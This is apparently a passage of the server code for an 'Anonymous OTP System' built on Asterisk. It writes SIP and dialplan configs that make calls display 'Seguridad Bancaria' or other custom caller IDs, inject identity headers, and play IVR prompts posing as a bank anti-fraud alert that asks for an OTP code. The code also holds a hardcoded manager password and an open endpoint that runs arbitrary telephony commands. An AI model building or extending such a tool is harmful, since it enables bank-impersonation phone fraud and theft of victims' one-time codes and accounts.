import express from 'express';
import path from 'path';
import fs from 'fs';
import net from 'net';
import { exec } from 'child_process';
import compression from 'compression';
import { createServer as createViteServer } from 'vite';

const app = express();
const PORT = 3000;

// Enable gzip/deflate compression for fast asset transfer
app.use(compression());
app.use(express.json({ limit: '10mb' }));

// Helper to execute AMI Action via raw TCP socket :5038
function sendAmiAction(host = '127.0.0.1', port = 5038, user = 'sammy', secret = 'Robert2026RDTGcvgbsg', commands: string[]): Promise<string> {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    let buffer = '';
    let loggedIn = false;
    const timeout = setTimeout(() => {
      socket.destroy();
      resolve(buffer || 'Timeout AMI (4s)');
    }, 4500);

    socket.connect(port, host, () => {
      const loginPayload = `Action: Login\r\nUsername: ${user}\r\nSecret: ${secret}\r\nEvents: off\r\n\r\n`;
      socket.write(loginPayload);
    });

    socket.on('data', (data) => {
      const text = data.toString();
      buffer += text;

      if ((buffer.includes('Message: Authentication accepted') || buffer.includes('Response: Success')) && !loggedIn) {
        loggedIn = true;
        for (const cmd of commands) {
          socket.write(`Action: Command\r\nCommand: ${cmd}\r\n\r\n`);
        }
        setTimeout(() => {
          socket.write(`Action: Logoff\r\n\r\n`);
        }, 300);
      }

      if (buffer.includes('Response: Goodbye')) {
        clearTimeout(timeout);
        socket.end();
        resolve(buffer);
      }
    });

    socket.on('error', (err) => {
      clearTimeout(timeout);
      resolve(`AMI Error: ${err.message}`);
    });

    socket.on('close', () => {
      clearTimeout(timeout);
      resolve(buffer);
    });
  });
}

const SOUNDS_CUSTOM_DIR = '/var/lib/asterisk/sounds/custom';

// Helper to safely write Asterisk config files with fallback permissions (direct, tmp + cp, sudo)
function writeAsteriskConfigFile(filePath: string, content: string): Promise<boolean> {
  return new Promise((resolve) => {
    try {
      fs.writeFileSync(filePath, content, 'utf8');
      console.log(`[ASTERISK-SYNC] ✓ Archivo escrito directamente: ${filePath}`);
      return resolve(true);
    } catch (err: any) {
      console.warn(`[ASTERISK-SYNC] Escritura directa falló en ${filePath} (${err.message}). Intentando fallback...`);
      const tempPath = `/tmp/${path.basename(filePath)}_${Date.now()}`;
      try {
        fs.writeFileSync(tempPath, content, 'utf8');
        exec(`cp "${tempPath}" "${filePath}" || sudo cp "${tempPath}" "${filePath}"`, (e) => {
          try { fs.unlinkSync(tempPath); } catch (_) {}
          if (!e) {
            console.log(`[ASTERISK-SYNC] ✓ Archivo actualizado vía copia fallback: ${filePath}`);
            resolve(true);
          } else {
            console.error(`[ASTERISK-SYNC] Error actualizando ${filePath}:`, e.message);
            resolve(false);
          }
        });
      } catch (subErr) {
        resolve(false);
      }
    }
  });
}

// Helper to generate native 8kHz 16-bit Mono PCM WAV buffer for Asterisk compatibility
function generatePcm8kWaveBuffer(durationSeconds = 3, freq = 440): Buffer {
  const sampleRate = 8000;
  const numSamples = Math.floor(sampleRate * durationSeconds);
  const dataSize = numSamples * 2;
  const buffer = Buffer.alloc(44 + dataSize);

  // RIFF header
  buffer.write('RIFF', 0);
  buffer.writeUInt32LE(36 + dataSize, 4);
  buffer.write('WAVE', 8);

  // fmt subchunk
  buffer.write('fmt ', 12);
  buffer.writeUInt32LE(16, 16);
  buffer.writeUInt16LE(1, 20); // PCM
  buffer.writeUInt16LE(1, 22); // Mono
  buffer.writeUInt32LE(sampleRate, 24); // 8000 Hz
  buffer.writeUInt32LE(sampleRate * 2, 28); // 16000 B/s
  buffer.writeUInt16LE(2, 32); // BlockAlign
  buffer.writeUInt16LE(16, 34); // 16 bits

  // data subchunk
  buffer.write('data', 36);
  buffer.writeUInt32LE(dataSize, 40);

  // Smooth sinusoidal audio waveform
  for (let i = 0; i < numSamples; i++) {
    const t = i / sampleRate;
    const envelope = Math.min(1, Math.min(t * 8, (durationSeconds - t) * 8));
    const sample = Math.sin(2 * Math.PI * freq * t) * envelope * 24000;
    buffer.writeInt16LE(Math.max(-32768, Math.min(32767, Math.floor(sample))), 44 + i * 2);
  }

  return buffer;
}

// Helper to guarantee /var/lib/asterisk/sounds/custom directory has valid PCM audio files
function ensureCustomAudioFilesExist() {
  const customDir = SOUNDS_CUSTOM_DIR;
  try {
    if (!fs.existsSync(customDir)) {
      fs.mkdirSync(customDir, { recursive: true });
    }
  } catch (e) {
    exec(`mkdir -p "${customDir}" || sudo mkdir -p "${customDir}"`, () => {});
  }

  const audios = [
    { name: 'alerta_banco_antifraude', freq: 520 },
    { name: 'solicitar_codigo_otp', freq: 680 },
    { name: 'un_momento_validando_informacion', freq: 440 },
    { name: 'operacion_bloqueada_exito', freq: 880 },
    { name: 'conectar_asesor_banco', freq: 587 },
    { name: 'bienvenida_corporativa', freq: 520 },
    { name: 'prompt_otp_6_digitos', freq: 680 },
  ];

  for (const aud of audios) {
    const wavPath = path.join(customDir, `${aud.name}.wav`);
    const gsmPath = path.join(customDir, `${aud.name}.gsm`);
    if (!fs.existsSync(wavPath) && !fs.existsSync(gsmPath)) {
      try {
        const buf = generatePcm8kWaveBuffer(3.5, aud.freq);
        fs.writeFileSync(wavPath, buf);
        console.log(`[ASTERISK-AUDIO] ✓ Auto-generado audio nativo 8kHz: ${wavPath}`);
      } catch (err) {
        const tmp = `/tmp/${aud.name}.wav`;
        try {
          fs.writeFileSync(tmp, generatePcm8kWaveBuffer(3.5, aud.freq));
          exec(`cp "${tmp}" "${wavPath}" || sudo cp "${tmp}" "${wavPath}"`, () => {
            try { fs.unlinkSync(tmp); } catch (_) {}
          });
        } catch (_) {}
      }
    }
  }
}

// ==========================================
// API ROUTES FIRST
// ==========================================

app.get('/api/health', (req, res) => {
  res.json({
    status: 'ok',
    system: 'Asterisk 20 Governor Backend',
    amiPort: 5038,
    ariPort: 8088,
    time: new Date().toISOString(),
  });
});

// Real-time Asterisk Endpoints reader directly from AMI socket
app.get('/api/asterisk/endpoints/live', async (req, res) => {
  try {
    const amiOutput = await sendAmiAction('127.0.0.1', 5038, 'sammy', 'Robert2026RDTGcvgbsg', [
      'pjsip show endpoints',
    ]);

    // Parse endpoints from output
    const lines = amiOutput.split('\n');
    const detectedEndpoints: string[] = [];

    for (const line of lines) {
      const match = line.match(/Endpoint:\s+([0-9a-zA-Z_-]+)\//);
      if (match && match[1]) {
        detectedEndpoints.push(match[1]);
      }
    }

    res.json({
      success: true,
      endpoints: detectedEndpoints,
      rawOutput: amiOutput,
    });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

let lastGeneratedPjsip = '';
let lastGeneratedDialplan = '';

// Serve raw generated configuration files for easy curl / wget update on VPS
app.get('/api/asterisk/config/extensions.conf', (req, res) => {
  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  if (lastGeneratedDialplan) {
    return res.send(lastGeneratedDialplan);
  }
  const localFile = path.join(process.cwd(), 'extensions.conf');
  if (fs.existsSync(localFile)) {
    return res.send(fs.readFileSync(localFile, 'utf8'));
  }
  if (fs.existsSync('/etc/asterisk/extensions.conf')) {
    return res.send(fs.readFileSync('/etc/asterisk/extensions.conf', 'utf8'));
  }
  res.send('; Dialplan pendiente de sincronizar');
});

app.get('/api/asterisk/config/pjsip.conf', (req, res) => {
  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  if (lastGeneratedPjsip) {
    return res.send(lastGeneratedPjsip);
  }
  const localFile = path.join(process.cwd(), 'pjsip.conf');
  if (fs.existsSync(localFile)) {
    return res.send(fs.readFileSync(localFile, 'utf8'));
  }
  if (fs.existsSync('/etc/asterisk/pjsip.conf')) {
    return res.send(fs.readFileSync('/etc/asterisk/pjsip.conf', 'utf8'));
  }
  res.send('; PJSIP pendiente de sincronizar');
});

// Test AMI connection in real-time
app.post('/api/asterisk/ami/test', async (req, res) => {
  const { host = '127.0.0.1', port = 5038, user = 'sammy', secret = 'Robert2026RDTGcvgbsg', command = 'core show version' } = req.body;
  try {
    const output = await sendAmiAction(host, port, user, secret, [command]);
    res.json({ success: true, output });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Endpoint to sync all extensions directly into /etc/asterisk/pjsip.conf and reload
app.post('/api/asterisk/sync/extensions', async (req, res) => {
  try {
    const { extensions, carriers } = req.body;

    if (!Array.isArray(extensions)) {
      return res.status(400).json({ success: false, error: 'extensions must be an array' });
    }

    const firstCarrier = (Array.isArray(carriers) && carriers.length > 0) ? carriers[0] : null;
    const activeCarrier = (firstCarrier && firstCarrier.name)
      ? firstCarrier.name.replace(/\s+/g, '_')
      : 'televox';
    const carrierHost = (firstCarrier && firstCarrier.host)
      ? firstCarrier.host
      : '52.144.46.192';
    const outboundCid = (firstCarrier && firstCarrier.outboundCallerId)
      ? firstCarrier.outboundCallerId
      : '+18005550199';

    // Generate clean pjsip.conf
    let pjsipContent = `; ========================================================\n`;
    pjsipContent += `; GENERADO AUTOMATICAMENTE POR ANONYMOUS OTP SYSTEM\n`;
    pjsipContent += `; Fecha: ${new Date().toISOString()}\n`;
    pjsipContent += `; Total Extensiones: ${extensions.length}\n`;
    pjsipContent += `; ========================================================\n\n`;

    pjsipContent += `[general]\n\n`;

    pjsipContent += `[transport-udp]\n`;
    pjsipContent += `type = transport\n`;
    pjsipContent += `protocol = udp\n`;
    pjsipContent += `bind = 0.0.0.0:5060\n\n`;

    pjsipContent += `[transport-wss]\n`;
    pjsipContent += `type = transport\n`;
    pjsipContent += `protocol = wss\n`;
    pjsipContent += `bind = 0.0.0.0:8089\n\n`;

    for (const ext of extensions) {
      const num = ext.extension;
      const pass = ext.secret || 'password123';
      const callerIdNum = ext.callerIdNum || outboundCid;
      const callerIdName = ext.callerIdName || ext.name || 'Seguridad Bancaria';
      const callerId = `"${callerIdName}" <${callerIdNum}>`;
      const codecs = (ext.codecs && ext.codecs.length > 0) ? ext.codecs.join(',') : 'ulaw,alaw,g722';

      pjsipContent += `; --- EXTENSIÓN ${num} (${ext.name || 'Agente'}) ---\n`;
      pjsipContent += `[${num}]\n`;
      pjsipContent += `type = endpoint\n`;
      pjsipContent += `context = ${ext.context || 'from-internal'}\n`;
      pjsipContent += `disallow = all\n`;
      pjsipContent += `allow = ${codecs}\n`;
      pjsipContent += `auth = ${num}\n`;
      pjsipContent += `aors = ${num}\n`;
      pjsipContent += `callerid = ${callerId}\n`;
      pjsipContent += `direct_media = no\n`;
      pjsipContent += `rtp_symmetric = yes\n`;
      pjsipContent += `force_rport = yes\n`;
      pjsipContent += `rewrite_contact = yes\n`;
      pjsipContent += `send_pai = yes\n`;
      pjsipContent += `send_rpid = yes\n`;
      pjsipContent += `trust_id_outbound = yes\n`;
      pjsipContent += `callerid_privacy = allowed\n`;
      pjsipContent += `transport = transport-udp\n\n`;

      pjsipContent += `[${num}]\n`;
      pjsipContent += `type = auth\n`;
      pjsipContent += `auth_type = userpass\n`;
      pjsipContent += `username = ${num}\n`;
      pjsipContent += `password = ${pass}\n\n`;

      pjsipContent += `[${num}]\n`;
      pjsipContent += `type = aor\n`;
      pjsipContent += `max_contacts = ${ext.maxContacts || 5}\n`;
      pjsipContent += `remove_existing = yes\n\n`;
    }

    // Process carriers/trunks if provided
    if (Array.isArray(carriers) && carriers.length > 0) {
      pjsipContent += `; ========================================================\n`;
      pjsipContent += `; TRONCALES / CARRIERS SIP (OUTBOUND & INBOUND)\n`;
      pjsipContent += `; ========================================================\n\n`;

      for (const carrier of carriers) {
        if (!carrier.name || !carrier.host) continue;
        const cName = carrier.name.replace(/\s+/g, '_');
        const cHost = carrier.host;
        const cPort = carrier.port || 5060;
        const cUser = carrier.username || cName;
        const cSecret = carrier.secret || '';
        const cContext = carrier.inboundContext || 'trunkinbound';
        const cCodecs = (carrier.codecs && carrier.codecs.length > 0) ? carrier.codecs.join(',') : 'ulaw,alaw,g729';

        pjsipContent += `; --- CARRIER: ${cName} (${cHost}:${cPort}) ---\n`;

        // 1. If registration is required with carrier
        if (carrier.authType === 'registration' && cSecret) {
          pjsipContent += `[reg_${cName}]\n`;
          pjsipContent += `type = registration\n`;
          pjsipContent += `outbound_auth = auth_${cName}\n`;
          pjsipContent += `server_uri = sip:${cHost}:${cPort}\n`;
          pjsipContent += `client_uri = sip:${cUser}@${cHost}:${cPort}\n`;
          pjsipContent += `contact_user = ${cUser}\n`;
          pjsipContent += `retry_interval = 60\n`;
          pjsipContent += `expiration = 3600\n`;
          pjsipContent += `transport = transport-udp\n\n`;
        }

        // 2. Auth section for Carrier (MUST BE BEFORE ENDPOINT)
        if (cSecret) {
          pjsipContent += `[auth_${cName}]\n`;
          pjsipContent += `type = auth\n`;
          pjsipContent += `auth_type = userpass\n`;
          pjsipContent += `username = ${cUser}\n`;
          pjsipContent += `password = ${cSecret}\n\n`;
        }

        // 3. AOR for Carrier (MUST BE BEFORE ENDPOINT)
        pjsipContent += `[${cName}]\n`;
        pjsipContent += `type = aor\n`;
        pjsipContent += `contact = sip:${cHost}:${cPort}\n`;
        pjsipContent += `qualify_frequency = ${carrier.qualifyFreq || 60}\n\n`;

        // 4. Endpoint for the Carrier
        pjsipContent += `[${cName}]\n`;
        pjsipContent += `type = endpoint\n`;
        pjsipContent += `context = ${cContext}\n`;
        pjsipContent += `disallow = all\n`;
        pjsipContent += `allow = ${cCodecs}\n`;
        pjsipContent += `aors = ${cName}\n`;
        if (carrier.authType === 'registration' && cSecret) {
          pjsipContent += `outbound_auth = auth_${cName}\n`;
        }
        if (carrier.outboundCallerId) {
          const cCidName = carrier.outboundCallerIdName || 'Seguridad Bancaria';
          pjsipContent += `callerid = "${cCidName}" <${carrier.outboundCallerId}>\n`;
        }
        // from_user DEBE coincidir con el usuario de autenticación del carrier para evitar rechazo 403 Forbidden
        const endpointFromUser = carrier.fromuser || cUser;
        if (endpointFromUser) {
          pjsipContent += `from_user = ${endpointFromUser}\n`;
        }
        pjsipContent += `from_domain = ${cHost}\n`;
        pjsipContent += `contact_user = ${cUser}\n`;
        pjsipContent += `direct_media = no\n`;
        pjsipContent += `rtp_symmetric = yes\n`;
        pjsipContent += `force_rport = yes\n`;
        pjsipContent += `rewrite_contact = yes\n`;
        pjsipContent += `send_pai = yes\n`;
        pjsipContent += `send_rpid = ${carrier.sendrpid || 'yes'}\n`;
        pjsipContent += `trust_id_outbound = yes\n`;
        pjsipContent += `trust_id_inbound = ${carrier.trustrpid || 'yes'}\n`;
        pjsipContent += `callerid_privacy = allowed\n`;
        pjsipContent += `transport = transport-udp\n\n`;

        // 5. Identify for incoming IP/host traffic
        pjsipContent += `[${cName}-identify]\n`;
        pjsipContent += `type = identify\n`;
        pjsipContent += `endpoint = ${cName}\n`;
        pjsipContent += `match = ${cHost}\n\n`;
      }
    }

    // Generate extensions.conf (Dialplan) with outbound routing to Carrier
    let dialplanContent = `; ========================================================\n`;
    dialplanContent += `; DIALPLAN DE LLAMADAS INTERNAS Y SALIENTES VIA PJSIP\n`;
    dialplanContent += `; Auto-generado por Anonymous OTP Asterisk Platform\n`;
    dialplanContent += `; ========================================================\n\n`;
    dialplanContent += `[general]\nstatic=yes\nwriteprotect=no\n\n`;

    dialplanContent += `[globals]\n`;
    dialplanContent += `GLOBAL_CARRIER_HOST=${carrierHost}\n`;
    dialplanContent += `GLOBAL_DEFAULT_INTRO=custom/alerta_banco_antifraude\n`;
    dialplanContent += `GLOBAL_DEFAULT_PROMPT=custom/solicitar_codigo_otp\n`;
    dialplanContent += `GLOBAL_DEFAULT_WAIT=custom/un_momento_validando_informacion\n`;
    dialplanContent += `GLOBAL_DEFAULT_SUCCESS=custom/operacion_bloqueada_exito\n`;
    dialplanContent += `GLOBAL_DEFAULT_AGENT=custom/conectar_asesor_banco\n\n`;

    dialplanContent += `; Subrutina Pre-Dial para inyectar cabeceras PJSIP en canal saliente real\n`;
    dialplanContent += `[sub-pjsip-headers]\n`;
    dialplanContent += `exten => s,1,NoOp(=== Inyectando PJSIP Headers en Canal Saliente: \${CHANNEL} ===)\n`;
    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Privacy)=none)\n`;
    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,P-Asserted-Identity)=<sip:\${CALLERID(num)}@\${GLOBAL_CARRIER_HOST}>)\n`;
    dialplanContent += ` same => n,Set(PJSIP_HEADER(add,Remote-Party-ID)=<sip:\${CALLERID(num)}@\${GLOBAL_CARRIER_HOST}>;party=calling;screen=yes;privacy=off)\n`;
    dialplanContent += ` same => n,Return()\n\n`;

    dialplanContent += `[from-internal]\n`;
    dialplanContent += `; 1. Llamadas internas entre extensiones (1001-1999)\n`;
    dialplanContent += `exten => _1XXX,1,NoOp(Llamada interna a extension \${EXTEN})\n`;
    dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN},30,Tt)\n`;
    dialplanContent += ` same => n,Hangup()\n\n`;

    dialplanContent += `; 2. Acceso y Prueba Directa IVR desde Softphone X-Lite (Extension 8888)\n`;
    dialplanContent += `exten => 8888,1,NoOp(=== PRUEBA DIRECTA IVR EXT 8888: Marcando al cliente o simulando IVR ===)\n`;
    dialplanContent += ` same => n,Set(IS_TEST_CALL=1)\n`;
    dialplanContent += ` same => n,Set(CALL_DEST=8888)\n`;
    dialplanContent += ` same => n,Set(CALLING_AGENT=\${CALLERID(num)})\n`;
    dialplanContent += ` same => n,Set(IVR_AGENT_EXTEN=1001)\n`;
    dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n\n`;

    dialplanContent += `; 2b. Acceso a Simulador IVR Local en Auricular (*8888 o 8880)\n`;
    dialplanContent += `exten => *8888,1,NoOp(Prueba Directa IVR Local desde Extension \${CALLERID(num)})\n`;
    dialplanContent += ` same => n,Set(IS_TEST_CALL=1)\n`;
    dialplanContent += ` same => n,Set(CALL_DEST=8888)\n`;
    dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n`;
    dialplanContent += `exten => 8880,1,NoOp(Prueba Directa IVR Local desde Extension \${CALLERID(num)})\n`;
    dialplanContent += ` same => n,Set(IS_TEST_CALL=1)\n`;
    dialplanContent += ` same => n,Set(CALL_DEST=8888)\n`;
    dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n\n`;

    dialplanContent += `; 3. Regla Saliente USA / Canada 11 digitos (ej. 16104803845)\n`;
    dialplanContent += `exten => _1NXXNXXXXXX,1,NoOp(Llamada Saliente 11 digitos a \${EXTEN} via ${activeCarrier})\n`;
    dialplanContent += ` same => n,Set(CALLING_AGENT=\${CALLERID(num)})\n`;
    dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NUM=\${DB(extension_cid/\${CALLING_AGENT}/number)})\n`;
    dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NAME=\${DB(extension_cid/\${CALLING_AGENT}/name)})\n`;
    dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${AGENT_CUSTOM_CID_NUM}):Set(CALLERID(num)=${outboundCid}))\n`;
    dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=Seguridad Bancaria))\n`;
    dialplanContent += ` same => n,Set(CALLERID(pres)=allowed_passed_screen)\n`;
    dialplanContent += ` same => n,Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>)\n`;
    dialplanContent += ` same => n,NoOp(Marcando \${EXTEN} por troncal ${activeCarrier} con CallerID \${CALLERID(all)})\n`;
    dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN}@${activeCarrier},60,Ttb(sub-pjsip-headers^s^1))\n`;
    dialplanContent += ` same => n,GotoIf($["\${DIALSTATUS}" = "ANSWER"]?dial11_done)\n`;
    dialplanContent += ` same => n,GotoIf($["\${DIALSTATUS}" = "BUSY"]?dial11_busy)\n`;
    dialplanContent += ` same => n,NoOp(Fallback Intento 2 con +: +\${EXTEN})\n`;
    dialplanContent += ` same => n,Dial(PJSIP/+\${EXTEN}@${activeCarrier},60,Ttb(sub-pjsip-headers^s^1))\n`;
    dialplanContent += ` same => n,GotoIf($["\${DIALSTATUS}" = "ANSWER"]?dial11_done)\n`;
    dialplanContent += ` same => n,GotoIf($["\${DIALSTATUS}" = "BUSY"]?dial11_busy)\n`;
    dialplanContent += ` same => n,NoOp(Fallback Intento 3 a 10 digitos: \${EXTEN:1})\n`;
    dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN:1}@${activeCarrier},60,Ttb(sub-pjsip-headers^s^1))\n`;
    dialplanContent += ` same => n(dial11_done),Hangup()\n`;
    dialplanContent += ` same => n(dial11_busy),Playtones(busy)\n`;
    dialplanContent += ` same => n,Wait(3)\n`;
    dialplanContent += ` same => n,Hangup()\n\n`;

    dialplanContent += `; 4. Regla Saliente 10 digitos (antepone 1)\n`;
    dialplanContent += `exten => _NXXNXXXXXX,1,NoOp(Llamada Saliente 10 digitos a 1\${EXTEN} via ${activeCarrier})\n`;
    dialplanContent += ` same => n,Set(CALLING_AGENT=\${CALLERID(num)})\n`;
    dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NUM=\${DB(extension_cid/\${CALLING_AGENT}/number)})\n`;
    dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NAME=\${DB(extension_cid/\${CALLING_AGENT}/name)})\n`;
    dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${AGENT_CUSTOM_CID_NUM}):Set(CALLERID(num)=${outboundCid}))\n`;
    dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=Seguridad Bancaria))\n`;
    dialplanContent += ` same => n,Set(CALLERID(pres)=allowed_passed_screen)\n`;
    dialplanContent += ` same => n,Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>)\n`;
    dialplanContent += ` same => n,Dial(PJSIP/1\${EXTEN}@${activeCarrier},60,Ttb(sub-pjsip-headers^s^1))\n`;
    dialplanContent += ` same => n,GotoIf($["\${DIALSTATUS}" = "ANSWER"]?dial10_done)\n`;
    dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN}@${activeCarrier},60,Ttb(sub-pjsip-headers^s^1))\n`;
    dialplanContent += ` same => n(dial10_done),Hangup()\n\n`;

    dialplanContent += `; 5. Regla Saliente Generica para cualquier otro numero saliente\n`;
    dialplanContent += `exten => _X.,1,NoOp(Llamada Saliente a \${EXTEN} via ${activeCarrier})\n`;
    dialplanContent += ` same => n,Set(CALLING_AGENT=\${CALLERID(num)})\n`;
    dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NUM=\${DB(extension_cid/\${CALLING_AGENT}/number)})\n`;
    dialplanContent += ` same => n,Set(AGENT_CUSTOM_CID_NAME=\${DB(extension_cid/\${CALLING_AGENT}/name)})\n`;
    dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${AGENT_CUSTOM_CID_NUM}):Set(CALLERID(num)=${outboundCid}))\n`;
    dialplanContent += ` same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=Seguridad Bancaria))\n`;
    dialplanContent += ` same => n,Set(CALLERID(pres)=allowed_passed_screen)\n`;
    dialplanContent += ` same => n,Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>)\n`;
    dialplanContent += ` same => n,Dial(PJSIP/\${EXTEN}@${activeCarrier},60,Ttb(sub-pjsip-headers^s^1))\n`;
    dialplanContent += ` same => n,Hangup()\n\n`;

    dialplanContent += `[trunkinbound]\n`;
    dialplanContent += `exten => _X.,1,NoOp(Llamada Entrante por Troncal: \${CALLERID(num)})\n`;
    dialplanContent += ` same => n,Goto(ivr-otp,s,1)\n\n`;

    dialplanContent += `; ========================================================\n`;
    dialplanContent += `; CONTEXTO IVR INTERACTIVO CON AUDIOS PREGRABADOS\n`;
    dialplanContent += `; ========================================================\n`;
    dialplanContent += `[ivr-otp]\n`;
    dialplanContent += `exten => s,1,NoOp(=== IVR INTERACTIVO CON AUDIOS PREGRABADOS ===)\n`;
    dialplanContent += ` same => n,Answer()\n`;
    dialplanContent += ` same => n,Wait(1)\n`;
    dialplanContent += ` same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})\n`;
    dialplanContent += ` same => n,Set(CUSTOM_CID_NUM=\${DB(ivr_vars/\${TARGET_DEST}_cid_num)})\n`;
    dialplanContent += ` same => n,Set(CUSTOM_CID_NAME=\${DB(ivr_vars/\${TARGET_DEST}_cid_name)})\n`;
    dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${CUSTOM_CID_NUM}))\n`;
    dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${CUSTOM_CID_NAME}))\n`;
    dialplanContent += ` same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>))\n`;
    dialplanContent += ` ; Cascada de resolucion para Audio de Bienvenida / Alerta\n`;
    dialplanContent += ` same => n,Set(IVR_INTRO=\${DB(ivr_vars/\${TARGET_DEST}_intro)})\n`;
    dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${DB(ivr_vars/8888_intro)}))\n`;
    dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${DB(ivr_vars/default_intro)}))\n`;
    dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${DB(ivr_vars/global_intro)}))\n`;
    dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${GLOBAL_DEFAULT_INTRO}))\n`;
    dialplanContent += ` same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=custom/alerta_banco_antifraude))\n`;

    dialplanContent += ` ; Cascada de resolucion para Audio de Solicitud de Codigo (Prompt OTP)\n`;
    dialplanContent += ` same => n,Set(IVR_PROMPT=\${DB(ivr_vars/\${TARGET_DEST}_prompt)})\n`;
    dialplanContent += ` same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=\${DB(ivr_vars/8888_prompt)}))\n`;
    dialplanContent += ` same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=\${DB(ivr_vars/default_prompt)}))\n`;
    dialplanContent += ` same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=\${DB(ivr_vars/global_prompt)}))\n`;
    dialplanContent += ` same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=\${GLOBAL_DEFAULT_PROMPT}))\n`;
    dialplanContent += ` same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=custom/solicitar_codigo_otp))\n`;

    dialplanContent += ` ; Cascada de resolucion para Audio de Espera / Validacion\n`;
    dialplanContent += ` same => n,Set(IVR_WAIT=\${DB(ivr_vars/\${TARGET_DEST}_wait)})\n`;
    dialplanContent += ` same => n,ExecIf($["\${IVR_WAIT}" = ""]?Set(IVR_WAIT=\${DB(ivr_vars/8888_wait)}))\n`;
    dialplanContent += ` same => n,ExecIf($["\${IVR_WAIT}" = ""]?Set(IVR_WAIT=\${DB(ivr_vars/default_wait)}))\n`;
    dialplanContent += ` same => n,ExecIf($["\${IVR_WAIT}" = ""]?Set(IVR_WAIT=\${GLOBAL_DEFAULT_WAIT}))\n`;
    dialplanContent += ` same => n,ExecIf($["\${IVR_WAIT}" = ""]?Set(IVR_WAIT=custom/un_momento_validando_informacion))\n`;

    dialplanContent += ` ; Cascada de resolucion para Audio de Exito\n`;
    dialplanContent += ` same => n,Set(IVR_SUCCESS=\${DB(ivr_vars/\${TARGET_DEST}_success)})\n`;
    dialplanContent += ` same => n,ExecIf($["\${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=\${DB(ivr_vars/8888_success)}))\n`;
    dialplanContent += ` same => n,ExecIf($["\${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=\${DB(ivr_vars/default_success)}))\n`;
    dialplanContent += ` same => n,ExecIf($["\${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=\${GLOBAL_DEFAULT_SUCCESS}))\n`;
    dialplanContent += ` same => n,ExecIf($["\${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=custom/operacion_bloqueada_exito))\n`;

    dialplanContent += ` ; Cascada de resolucion para Audio de Conectar con Asesor (Press 1)\n`;
    dialplanContent += ` same => n,Set(IVR_AGENT=\${DB(ivr_vars/\${TARGET_DEST}_agent)})\n`;
    dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=\${DB(ivr_vars/default_agent)}))\n`;
    dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=\${GLOBAL_DEFAULT_AGENT}))\n`;
    dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=custom/conectar_asesor_banco))\n`;

    dialplanContent += ` same => n,Set(IVR_AGENT_EXTEN=\${DB(ivr_vars/\${TARGET_DEST}_agent_exten)})\n`;
    dialplanContent += ` same => n,ExecIf($["\${IVR_AGENT_EXTEN}" = ""]?Set(IVR_AGENT_EXTEN=1001))\n`;
